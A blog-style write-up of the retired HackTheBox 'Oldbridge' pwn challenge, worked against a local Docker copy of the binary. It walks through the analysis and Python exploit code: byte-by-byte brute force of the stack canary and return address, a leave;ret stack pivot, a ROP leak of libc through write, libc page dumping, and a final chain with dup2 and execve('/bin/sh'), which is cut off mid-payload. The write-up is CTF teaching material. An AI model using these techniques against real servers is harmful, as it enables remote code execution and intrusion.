---
layout: post
title: HackTheBox's Oldbridge pwn challenge writeup 
description: "Oldbridge is a retired PWN challenge from Hack The Box. Here's how I solved it"

---

Oldbridge is a retired PWN challenge from Hack The Box. Here's how I solved it:

### Binary Analysis
We get a binary copy of the program that runs on the server so we can run it locally and test it.
In this challenge I use Docker to setup the local server for easy debug and testing.

Like previous challenges, I like to start with a binary examination on program... see what it does and where is the exploit.

Let's take a look at the `main`:
Thanks to Ghidra's decompiler we can get general idea of the `main` function:
```c
/* ...  */
  while( true ) {
    local_50 = 0x10;
    local_40 = accept(server_sd,&local_28,&local_50);
    if (local_40 < 0) {
      perror("accept");
      close(server_sd);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_3c = fork();
    if (local_3c < 0) break;
    if (local_3c == 0) {
      iVar1 = check_username();
      if (iVar1 != 0) {
        write(local_40,"Username found!\n",0x10);
      }
      close(local_40);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    close(local_40);
  }
  perror("fork");
  close(local_40);
  close(server_sd);
                    /* WARNING: Subroutine does not return */
  exit(1);
/* ... */
```

While it may seem confusing at first, the main loop here just `fork`s on each new connection and calls `check_username` on the child process (the parent does not enter that if statement and returns back to listening to more clients connecting).

No vulnerable code so far, as far as I can tell - we didn't even get to the heart of the program yet. Let's dive to `check_username`

```c
ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}

```
After a little bit of cleaning and variable renaming we can see the picture more clearly:

```c

ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}
```

The interesting part here is:

1. The `read` calls fill in a buffer with `0x420 = 1056` bytes **but** the buffer it stores it into is only 1032! Buffer overflow detected! are we done?
2. Every single bit of the input from the user is XORed with `0xdz`, then the start of the string is checked against the "hidden" username: `il{dih`. <br>
To reveal the real username we can XOR that text with `0xd` again. We can use a simple Python one-liner we can figure out what is the username:
```python
>>> "".join([chr(ord(t) ^ 0xd) for t in "il{dih"])
'davide'
```

We have enough information about that binary, now I feel it's time to move to live testing and playing around with it. 

I should note that usually the binary examination is much more complex, and starting with the "playing around" phase is probably the smarter choice for pwn challenges in the future. But hey, I'm here to learn.

### Setting up our test server (using Docker)
Docker is a nice tool we can use to setup a linux environment for the process to run so we can play around with it.
To do that, I've downloaded the demo Ubuntu image, installed gdb,peda and more tools on it, and run the following command:

```$ docker run --rm -it --cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined -v ~/Desktop:/from_host -w /app new_ubuntu```

* `--cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined` is used for allowing the container to run and debug processes, while connecting the 1337 port between the host (our machine) and the container(which will run the server). That way we can access the server directly from our machine as the client
* `-v ~/Desktop:/from_host` Give the container access to the volume specified from the host. So the container may access our `oldbridge` binary

After running it, we can test the program a little bit:
```
/Users/shaked$ nc localhost 1337
Username: gimme root
/Users/shaked$ nc localhost 1337
Username: davide
Username found!
/Users/shaked$ nc localhost 1337
Username: davideasdasdasdasdasdasdasd
Username found!
```

We know that our buffer is 1032 bytes long, what happens when we overflow it?<br>
`$ python -c 'print "A"*1032' | nc localhost 1337` (1032 "A"s plus a newline character = 1033 bytes)

We get nothing back, and if we look at the server:
```
root@04a0530e836b:/from_host/programming2/challenges/hack_the_box/oldbridge# ./oldbridge 1337
*** stack smashing detected ***: <unknown> terminated
```

### Problem #1 - Stack canary 
What had happend? why not SIGSEGV? If we go back to the source code again we can see that there's a use of a stack guard, a stack canary value. A stack canary is a random value that is placed right before the stack frame ends. That is, it is placed above the old frame pointer and the return address.

When the function is done, there's a check between the stack canary and the location which is it was originally stored (which we cannot override) and if there's a mismatch - the program knows someone has messed up the stack and exit *un-gracefully*;
```c
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```

### Problem #2 - Position Independent Executable (PIE) 
Usually when you compile a simple program, the compiler can assume the regular address space for the program headers (.text section, .bss, .data, etc...) and during runtime the system would not randomize that part (as we saw in ROPme).

But - when you compile a library, you compile it as PIE, so the code inside it may be loaded into any address in the future. 

You can, if you like - compile a program with the `-fPIE` flag and it would still run perfectly. And it would have effectively randomize the code section of our binary during runtime. This makes things hard for us in finding gadgets to use, because everytime the program loads, a new address is issued for all of the variables! **But** let us not forget that the randomization is **page based*, and only the base of the section is randomized.

So if we would know the base which the .text section was loaded into, we can figure out where the rest of the symbols are by looking at the binary given to us.

### Problem #3 - ASLR 
Same as ROPme, makes it hard for us to find gadgets, not just in the .text section - but also from libc or the stack

### Problem #4 - Libc version
Even if we would defeat ASLR, we still need to know the offsets of gadgets for us to use.

### One solution for all
In the `main()`, before any client is being processed, the process is `fork`ed. 

`fork()` is copying the entire process memory to a child except for 1 register, the `rax`. This is so that the child would be able to tell that it was forked. 

**This is GREAT for us because this means that every child created, and the parent as well, will share the same libc base, .text section base, the stack canary and even the stack base!**

So what do we do? first we have to leak the canary, because it is the first value that is being overriden after the buffer overflows.

Our strategy would be to try and override a *single* byte from the canary, one at a time - and if we get a valid repsponse from the server( "Username found!") we can learn that the system thinks the canary is intact and we effectively learned a byte from the canary!

We can now start writing our exploit:
```python
import socket

SERVER = ("localhost", 1337)

def send_payload(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)
    s.send(p)

    res = False
    try:
        line = s.recv(4096)
        res = "Username found!" in line

    finally:
        s.close()

    return res

def leak_next_byte(prefix):
    for test_byte in [chr(t) for t in range(256)]:
        if send_payload(prefix + test_byte):
            print "Found:", hex(ord(test_byte))
            return prefix + test_byte


def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    leak_next_byte(payload)

if __name__ == "__main__":
    main()
```

We have a small function that sends a payload and reports if the payload is good (by checking if the server returned the "Username found!" message). If the server fails - no message will be sent back and we would know that we have broken the stack canary.<br>
We use `leak_next_byte` to leak the next 8 bytes from the stack:

```python
def leak_canary(prefix):
    payload = prefix
    for i in range(8):
        payload = leak_next_byte(payload)
    return payload[-8:]
```

```
$ python exploit.py 
Found: 0xd
Found: 0xcc
Found: 0x75
Found: 0xf0
Found: 0x95
Found: 0xff
Found: 0x6c
Found: 0xcb
Canary:
0xcb6cff95f075cc0dL
```

Note: the canary we display is the canary after XORed with `0xd`. This is because our byte that we test are XORed and then placed to the canary.

### What's past the canary?
After the canary there's the old frame pointer. Which usually we find it insignificant because we want to go straight ahead to override the return address which located right after it.

But in here, we do not have enough stack space for a long ROP chain like in ROPme, we can override the buffer (1032 bytes), the canary (1040), the old rbp (1048) and the return address (1056) and *that's it*.

Before we think about how to jump around in the program, let's use the previous technique to leak the old RBP on the stack as well as the return address.<br>
We can do that because if we want to receive "Username found!" from the server, the `main()` function would need the right stack pointer set to load values from the stack to those `write` calls. if we mess it up even a little bit, we can notice it in our client side by not receiving the message.

**Leaking the return address is a little bit more difficult**. Because we start by overriding the least significant byte, the program might return to some other location in the `main`, it could be another `fork` or `accept` and make things be a little less predictible for us. <br>
But - since the randomization is only effective for the least 12 bits of the return address, the first byte will definitely not change:

The return address from `check_username` is:
```
   0x0000555555554eca <+561>:	call   0x555555554b6f <check_username>
   0x0000555555554ecf <+566>:	test   eax,eax
```

So it would always end with `0xcf`!

```python
def leak_n_bytes(prefix, n):
    payload = prefix
    for i in range(n):
        payload = leak_next_byte(payload)
    return payload[-n:]

def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    print "Leaking canary"
    canary = leak_n_bytes(payload, 8)
    print "Leaking old RBP"
    old_rbp = leak_n_bytes(payload + canary, 8)
    print "Leaking return address"
    ret_addr = leak_n_bytes(payload + canary + old_rbp + chr(ord("\xcf") ^ 0xd), 7)
```

```
$ python exploit.py 
Leaking canary
Found: 0xd
Found: 0xc0
Found: 0x2a
Found: 0xf7
Found: 0x4c
Found: 0xf6
Found: 0x34
Found: 0x5d
Leaking old RBP
Found: 0x5d
Found: 0xf6
Found: 0x2b
Found: 0xad
Found: 0xf2
Found: 0x72
Found: 0xd
Found: 0xd
Leaking return address
Found: 0x13
Found: 0xe9
Found: 0x6e
Found: 0xad
Found: 0x58
Found: 0xd
Found: 0xd
Found: 0x0
```

What we have so far:

1. Using the return address we can now learn the **start of the .text section**. We can use gadgets from there, as well as jumping to the @plt of functions there and probably use the Global Offset Table for libc functions to leak libc addresses

2. Using the RBP, we can learn **the address of our buffer on the stack** because the offset from the old rbp and our stack will be fixed regardless of the starting address of the stack section in memory.

Let's start by computing the address of our buffer on the stack. By looking at the server, when the server `read`s our input to `0x7fffffffe110`:
```
=> 0x555555554bc9 <check_username+90>:	call   0x555555554970 <read@plt>
   0x555555554bce <check_username+95>:	mov    DWORD PTR [rbp-0x414],eax
   0x555555554bd4 <check_username+101>:	mov    DWORD PTR [rbp-0x418],0x0
   0x555555554bde <check_username+111>:	jmp    0x555555554c0b <check_username+156>
   0x555555554be0 <check_username+113>:	mov    eax,DWORD PTR [rbp-0x418]
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0x7fffffffe110 --> 0x7ffff7ffe4c8 --> 0x7ffff7ffe428 --> 0x7ffff7ff1510 --> 0x7ffff7ffe170 --> 0x555555554000 (--> ...)
arg[2]: 0x420 
```

And if we check out the old rbp value (at the bottom of the stack frame), we can check that value by looking at where our current `rbp` is pointing to `0x00007fffffffe590`:

```
gdb-peda$ x/4gx $rbp
0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
gdb-peda$ x/16gx $rbp-0x20
0x7fffffffe500:	0x4242424242424242	0x4242424242424242
0x7fffffffe510:	0x4242424242424242	0xc68342c2b57a9500
0x7fffffffe520:	0x00007fffffffe590	0x0000555555554ecf
0x7fffffffe530:	0x00007fffffffe678	0x00000002f7dd7660
0x7fffffffe540:	0x00007fffffffe5a8	0x0000000100000010
0x7fffffffe550:	0x0000001000000539	0x0000000000000004
0x7fffffffe560:	0x0000000039050002	0x0000000000000000
0x7fffffffe570:	0x010011ac589b0002	0x0000000000000000
```

The distance from old rbp `0x00007fffffffe590` to our buffer `0x7fffffffe110` is `0x480`.

Moving on to the .text section, we leaked a specific address of an instruction inside the `main` function (the one that ends with `0xcf`).<br>
We can again go back to our server to see the offset of that value from the start of the section

```
gdb-peda$ bt
#0  0x0000555555554bce in check_username ()
#1  0x0000555555554ecf in main ()
#2  0x00007ffff7a05b97 in __libc_start_main (main=0x555555554c99 <main>, argc=0x2, argv=0x7fffffffe678, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffe668) at ../csu/libc-start.c:310
#3  0x0000555555554a5a in _start ()
gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
So the distance between the return address `0x0000555555554bce` and the start of the section `0x0000555555554000` is exactly `0xbce` bytes.

We now have the code section start, as well as the start of our buffer on the stack. The next step that I usually take is to go towards a libc leak and figure out the libc version, but here's where our big problem lies: **we have not space for a ROP chain!** as we cannot override past the return address, what do we do?

### Stack pivoting, create your own stack
Stack pivoting is a fancy name for replacing the program's `rsp` with a pointer to some area in the memory which you control, how does that help us?

Well, since the end of the `check_username` function is a `ret` instruction, what if we could control the stack pointer to point to somewhere inside our buffer? we would be able to control that `ret`!

To do so we need to change the `rsp`, and we have only 1 jump that we can control in order to get it.

### The LEAVE instruction
The [leave](https://c9x.me/x86/html/file_module_x86_id_154.html) instruction which is present at the end of the function restores the old stack pointer of the previous frame. The instruction is "leaving" the current frame.<br>
To do so first: it perform `rsp = rbp`. Restoring the `rsp` to the value from the previous frame.<br>
I like to think of `leave` as the "`ret`" instruction of the stack.

Great, so if we `ret` to the `leave` instruction again (1 instruction above the original `ret`), we are basically "popping" the rbp again effectively changing the `rsp` to the value of our choosing!<br>
All that is required of us is to change the return address to the `leave` instruction. After which the program will execute the `leave` and then the `ret`. The `ret` now will return to a value at the stop of the stack, which **is the custom stack now**

If we send the following payload:
```python
    text_section_base = ret_addr & 0xfffffffffffff000
    text_section_leave_ret = text_section_base + 0xc5c
    buffer_addr       = old_rbp - 0x480

    # After leaking the necessary values,
    # We create a new payload
    payload = "davide" + "AA"
    payload += p64(0xdeadbeefdeadbeef ^ Ds)

    # Pad to the end of buffer
    payload += "B" * (1032 - len(payload))

    payload += p64(canary ^ Ds)
    payload += p64(buffer_addr ^ Ds)
    payload += p64(text_section_leave_ret ^ Ds)

    send_payload(payload)
```


We get:
```
   0x555555554c5c <check_username+237>:	leave  
=> 0x555555554c5d <check_username+238>:	ret    
   0x555555554c5e <exit_server>:	push   rbp
   0x555555554c5f <exit_server+1>:	mov    rbp,rsp
   0x555555554c62 <exit_server+4>:	sub    rsp,0x20
   0x555555554c66 <exit_server+8>:	mov    DWORD PTR [rbp-0x14],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe118 --> 0xdeadbeefdeadbeef 
0008| 0x7fffffffe120 ('O' <repeats 200 times>...)
0016| 0x7fffffffe128 ('O' <repeats 200 times>...)
0024| 0x7fffffffe130 ('O' <repeats 200 times>...)
0032| 0x7fffffffe138 ('O' <repeats 200 times>...)
0040| 0x7fffffffe140 ('O' <repeats 200 times>...)
0048| 0x7fffffffe148 ('O' <repeats 200 times>...)
0056| 0x7fffffffe150 ('O' <repeats 200 times>...)
```

And from here we can write a pretty nice and long ROP chain that can take us where ever we like!

### Leaking an address of a function in libc
My next step usually is to go ahead to leak some entry from the GOT, take that address to some libc-database and then learn the libc version used in the remote machine.

So let's try that, we'll create a ROP chain to call something like: `write(int socket_fd, (void*) buffer_addr, ssize_t length)`. The `socket_fd` can be figured out by looking at our own process's file descriptors:

```
=> 0x555555554bad <check_username+62>:	call   0x555555554910 <write@plt>
   0x555555554bb2 <check_username+67>:	lea    rcx,[rbp-0x410]
   0x555555554bb9 <check_username+74>:	mov    eax,DWORD PTR [rbp-0x424]
   0x555555554bbf <check_username+80>:	mov    edx,0x420
   0x555555554bc4 <check_username+85>:	mov    rsi,rcx
Guessed arguments:
arg[0]: 0x4   <---- file_descriptor
arg[1]: 0x555555554f94 ("Username: ")
arg[2]: 0xa ('\n')
```

The same fd can be seen when the process is using `read`:

```
=> 0x555555554bc9 <check_username+90>:	call   0x555555554970 <read@plt>
   0x555555554bce <check_username+95>:	mov    DWORD PTR [rbp-0x414],eax
   0x555555554bd4 <check_username+101>:	mov    DWORD PTR [rbp-0x418],0x0
   0x555555554bde <check_username+111>:	jmp    0x555555554c0b <check_username+156>
   0x555555554be0 <check_username+113>:	mov    eax,DWORD PTR [rbp-0x418]
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0x7fffffffe110 --> 0x7ffff7ffe4c8 --> 0x7ffff7ffe428 --> 0x7ffff7ff1510 --> 0x7ffff7ffe170 --> 0x555555554000 (--> ...)
arg[2]: 0x420 
```

The address we want to leak is some entry in the GOT table. Specifically we'll use `write@plt` to get the GOT entry of `write` so we can learn the address of that function in libc after the linker placed it there.

```
gdb-peda$ x/3i 0x555555554910
   0x555555554910 <write@plt>:	jmp    QWORD PTR [rip+0x20170a]        # 0x555555756020
   0x555555554916 <write@plt+6>:	push   0x1
   0x55555555491b <write@plt+11>:	jmp    0x5555555548f0
gdb-peda$ x/gx 0x555555756020
0x555555756020:	0x00007ffff7af4140
gdb-peda$ disas 0x00007ffff7af4140
Dump of assembler code for function __GI___libc_write:
   0x00007ffff7af4140 <+0>:	lea    rax,[rip+0x2e07b1]        # 0x7ffff7dd48f8 <__libc_multiple_threads>
   0x00007ffff7af4147 <+7>:	mov    eax,DWORD PTR [rax]
   0x00007ffff7af4149 <+9>:	test   eax,eax
   0x00007ffff7af414b <+11>:	jne    0x7ffff7af4160 <__GI___libc_write+32>
   0x00007ffff7af414d <+13>:	mov    eax,0x1
   0x00007ffff7af4152 <+18>:	syscall 
```

The address we're after is `0x555555756020` which contains the address of `write` at libc.
The address we want to leak is `0x555555756020 - libc_base = 0x202020` bytes from the start of `libc_base` *which we have already learned*. 

Now we know all of our arguments for `write`:
1. File descriptor = 0x4
2. Address of buffer: `libc_base + 0x202020`
3. Length = 0x8 (We want a QWORD, so 8 bytes)
4. The address of the function we want to call: `write@plt` is `libc_base + 0x202020` as well and we can call it

The last thing we need is to find a way to load these argument from the stack to the registers. Because as we remember, the arguments in this binary as **passed via registers**. So we have to find some gadgets in the .text section of the binary that would:
1. pop rdi (first argument)
2. pop rsi (second argument)
3. pop rdx (third argument)

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ ropsearch "pop rsi" 0x0000555555554000 0x0000555555556000
Searching for ROP gadget: 'pop rsi' in range: 0x555555554000 - 0x555555556000
0x0000555555554f71 : (b'5e415fc3')	pop rsi; pop r15; ret
gdb-peda$ ropsearch "pop rdi" 0x0000555555554000 0x0000555555556000
Searching for ROP gadget: 'pop rdi' in range: 0x555555554000 - 0x555555556000
0x0000555555554f73 : (b'5fc3')	pop rdi; ret
gdb-peda$ ropsearch "pop rdx" 0x0000555555554000 0x0000555555556000
Searching for ROP gadget: 'pop rdx' in range: 0x555555554000 - 0x555555556000
0x0000555555554b53 : (b'5ac3')	pop rdx; ret
```
Note: if `ropsearch` doesn't work, you need to `apt-get install nasm`.

We'll add these gadgets to our script:
```python
gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
gadget_pop_rdi_ret         = text_section_base + 0xf73
gadget_pop_rdx_ret         = text_section_base + 0xb53
```
Note: when we'll use `pop_rsi`, we have to remember that there's another `pop` taking place. 

So after leaking the canary, RBP and return address, we construct another payload this time to leak the address of `write` (by using `write`! isn't that confusing?)

```python
gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
gadget_pop_rdi_ret         = text_section_base + 0xf73
gadget_pop_rdx_ret         = text_section_base + 0xb53

text_section_write_got = text_section_base + 0x202020
text_section_write_plt = text_section_base + 0x910

# After leaking the necessary values,
# We create a new payload
payload = "davide" + "AA"

payload += p64(gadget_pop_rdi_ret ^ Ds)
payload += p64(0x4 ^ Ds)
payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
payload += p64(text_section_write_got ^ Ds)
payload += p64(0x1337)   # pop r15, dont-care
payload += p64(gadget_pop_rdx_ret ^ Ds)
payload += p64(0x8 ^ Ds)
payload += p64(text_section_write_plt ^ Ds)


# Pad to the end of buffer
payload += "B" * (1032 - len(payload))

payload += p64(canary ^ Ds)
payload += p64(buffer_addr ^ Ds)
payload += p64(text_section_leave_ret ^ Ds)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.recv(4096)  # server hello
s.send(payload)

write_libc = s.recv(8)
print "write@libc:", hex(unpack(write_libc))
s.close()
```
Note how `text_section_write_got` and `text_section_write_got` are not the same thing! one is an entry in the GOT which is not executable, the other is the PLT stub of `write`. 

Using this ROP chain we learn:
```
write@libc: 0x7ffff7af4140
```

Awesome! we can take this offset to some LIBC database and check the libc version, and from there compute other addresses located in this area and ROP our way to a shell

### Problem, the address cannot be found in the databases!

I've looked in some libc databases, namely https://github.com/niklasb/libc-database. And couldn't find the offset I found for `write` on the remote server in *any* of the databases that I've looked.

I thought I'd try a different approach: so I cannot learn the libc version - but who cares? I have control over `write` and I can plug in what ever address I like there get back a byte from the process's memory. <br>
I can use that to **leak all of the libc pages of the remote server's process** and look for the gadgets I want there. I thought that this might not have been the solution that most of the people who have solved this challenge used. But hey, if it works!

### Dumping the entire libc content and looking for useful gadgets

My goal is to leak all of the content of libc that is mapped to memory. Memory is mapped in chunks of pages. So I would take the address of `write` I have just leaked, and from this page I would scan up and down (jumping in size of a page which is usually `0x1000 = 4096`) and look for stuff I'm interested in.

Since I can control the arguments plugged to functions I don't care about finding "/bin/sh", I can just look for `system` or `execve`.

My strategy was to take the first few bytes from **my own libc implementation of functions** and look for them in server's. Using the strategy I couldn't find `system` as this is a rather large wrapper function that is likely to change between libc versions, but I did find `execve`.

`int execve(const char *path, char *const argv[], char *const envp[]);` requires 3 arguments: they other two usually cannot be null and may crash the program it is trying to run, but that is not the case for `/bin/sh`, this makes things easier even thought it would not have been such a problem delivering the arrays necessary for arguments 2 and 3 (since again, we have control over the stack and can deliver any arguments we like) 

### One last problem to solve
If we make the remote server execute `execve("/bin/sh", NULL, NULL)` we're still not there! why?

The shell is executed, however its inputs and outputs are the file descriptors inherited from the process that called `execve`, and if we recall - that process has its original standard input and output (file descriptors 0 and 1). And we communicate with the server via file descriptor 4.

To get around this issue, we'd like to replace the STDIN and STDOUT of the process with the file descriptor of the socket (0x4). <br>
To do that, we'll use the [dup2](https://linux.die.net/man/2/dup2) system call. dup2() duplicates a file descriptor (the first argument) to a second desired one. So our plan would be to:
1. `close(0)` close the STDIN
2. `close(1)` close the STDOUT
3. `dup2(4,0)` dup our socket's file descriptor to take the place of STDIN
4. `dup2(4,1)` same for STDOUT

This makes our ROP chain a little bit longer, but it's not that terrible as we have a lot of room in our buffer. And eventually, when we'll call `execve` - we would have complete control ove the shell.


### Enough chat, let's finish the exploit
First, we need to find the starting bytes of `dup2` and `execve` in our local libc implementation, and look for them in the libc pages dumped from the server. As these are already system calls, we dont need much but something like:
```
mov eax, [SYSCALL_NUM]
syscall
```
Let's do this:

```
gdb-peda$ x/8b dup2
0x7ffff7af49a0 <dup2>:	0xb8	0x21	0x00	0x00	0x00	0x0f	0x05	0x48
```
Since `0x0f 0x05` is the `syscall` instruction, we can just stop there

```
gdb-peda$ x/8b execve
0x7ffff7ac8e30 <execve>:	0xb8	0x3b	0x00	0x00	0x00	0x0f	0x05	0x48
```

I wrote something pretty ugly that gets the job done:
```python
libc_page = unpack(write_libc) & 0xfffffffffffff000
page_size = 0x1000
dup2_start      = "".join([chr(t) for t in [0xb8,	0x21,	0x00,	0x00,	0x00,	0x0f,	0x05]])
execve_start    = "".join([chr(t) for t in [0xb8,	0x3b,	0x00,	0x00,	0x00,	0x0f,	0x05]])

dup2_remote_addr = 0
execve_remote_addr = 0

# scan down
print "Scanning down"
while dup2_remote_addr == 0 or execve_remote_addr == 0:
    try:
        payload = "davide" + "AA"
        payload += p64(gadget_pop_rdi_ret ^ Ds)
        payload += p64(0x4 ^ Ds)
        payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
        payload += p64(libc_page ^ Ds)   # buffer = page
        payload += p64(0x1337)   # pop r15, dont-care
        payload += p64(gadget_pop_rdx_ret ^ Ds)
        payload += p64(page_size ^ Ds)  # length
        payload += p64(text_section_write_plt ^ Ds)
        # Pad to the end of buffer
        payload += "B" * (1032 - len(payload))
        payload += p64(canary ^ Ds)
        payload += p64(buffer_addr ^ Ds)
        payload += p64(text_section_leave_ret ^ Ds)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(SERVER)
        s.recv(4096)  # server hello
        s.send(payload)

        page_data = s.recv(page_size)
        if len(page_data) == 0:
            break

        if dup2_start in page_data:
            dup2_remote_addr = libc_page + page_data.index(dup2_start)
            print "Found dup2 @ {}".format(hex(dup2_remote_addr))

        
        if execve_start in page_data:
            execve_remote_addr = libc_page + page_data.index(execve_start)
            print "Found execve @ {}".format(hex(execve_remote_addr))


        s.close()
        libc_page -= page_size  # scan down

    except EOFError:
        break


# scan up
print "scanning up"
libc_page = unpack(write_libc) & 0xfffffffffffff000
while dup2_remote_addr == 0 or execve_remote_addr == 0:
    try:
        payload = "davide" + "AA"
        payload += p64(gadget_pop_rdi_ret ^ Ds)
        payload += p64(0x4 ^ Ds)
        payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
        payload += p64(libc_page ^ Ds)   # buffer = page
        payload += p64(0x1337)   # pop r15, dont-care
        payload += p64(gadget_pop_rdx_ret ^ Ds)
        payload += p64(page_size ^ Ds)  # length
        payload += p64(text_section_write_plt ^ Ds)
        # Pad to the end of buffer
        payload += "B" * (1032 - len(payload))
        payload += p64(canary ^ Ds)
        payload += p64(buffer_addr ^ Ds)
        payload += p64(text_section_leave_ret ^ Ds)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(SERVER)
        s.recv(4096)  # server hello
        s.send(payload)

        page_data = s.recv(page_size)
        if len(page_data) == 0:
            break

        if dup2_start in page_data:
            dup2_remote_addr = libc_page + page_data.index(dup2_start)
            print "Found dup2 @ {}".format(hex(dup2_remote_addr))

        
        if execve_start in page_data:
            execve_remote_addr = libc_page + page_data.index(execve_start)
            print "Found execve @ {}".format(hex(execve_remote_addr))


        s.close()
        libc_page += page_size  # scan down
    except EOFError:
        break

print "libc scan over"
```
Note: one loop for scanning down, same loop for scanning up - yeah I know it's terrible code but it worked for me when I was constructing it and I wanted to make it more clear for the writeup so I decided to keep it.

That's it, we have all of the information we need. Now we just construct the payload with the ROP chain, place a "/bin/sh" string on the stack and plug that to the `execve` which we will execute at the end of it:

The last part of the exploit looks like this:
```python
# Final payload for remote shell
payload = "davide" + "AA"  # address of that is buffer_start_addr

# close(0)
payload += p64(gadget_pop_rdi_ret ^ Ds)  # first, we ret here <---- (
payload += p64(0x0 ^ Ds)                 # pop this to RDI
payload += p64(text_section_close_plt ^ Ds)           # ret there

# close(1)
payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
payload += p64(0x1 ^ Ds)                 # pop this to RDI
payload += p64(text_section_close_plt ^ Ds)           # ret there

# dup2(4,0)
payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
payload += p64(0x4 ^ Ds)                 # pop this to RDI (socket's FD)
